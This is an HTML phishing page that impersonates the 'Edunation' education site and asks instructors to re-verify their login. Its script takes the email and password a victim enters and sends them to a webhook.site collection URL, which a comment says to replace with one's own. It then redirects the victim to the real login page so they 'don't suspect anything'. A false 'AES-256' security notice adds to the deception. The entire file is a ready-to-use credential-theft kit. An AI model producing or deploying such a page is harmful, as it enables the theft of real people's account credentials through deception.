<!DOCTYPE html>
<html>
<head>
    <title>Edunation | Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); width: 340px; border-top: 6px solid #0056b3; }
        .logo { font-size: 26px; font-weight: bold; color: #0056b3; text-align: center; margin-bottom: 5px; }
        .sub { font-size: 14px; color: #555; text-align: center; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; padding: 12px; background-color: #0056b3; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 15px; }
        button:hover { background-color: #004494; }
        .notice { font-size: 11px; color: #888; text-align: center; margin-top: 20px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Edunation</div>
        <div class="sub">Please re-verify your instructor credentials to continue.</div>
        <form id="p-form">
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Verify Account</button>
        </form>
        <div class="notice">
            Secure Encryption Enforced (AES-256).<br>
            Authorized Personnel Only.
        </div>
    </div>

    <script>
        // Auto-fill email from URL parameter (?email=...)
        const params = new URLSearchParams(window.location.search);
        if(params.has('email')) { document.getElementById('email').value = params.get('email'); }

        document.getElementById('p-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            // REPLACE THE URL BELOW WITH YOUR WEBHOOK.SITE URL
            fetch("	https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({ user: email, password: pass })
            }).then(() => {
                // Redirects back to the real Edunation login so they don't suspect anything
                window.location.href = "https://edunation.com/login";
            });
        });
    </script>
</body>
</html>
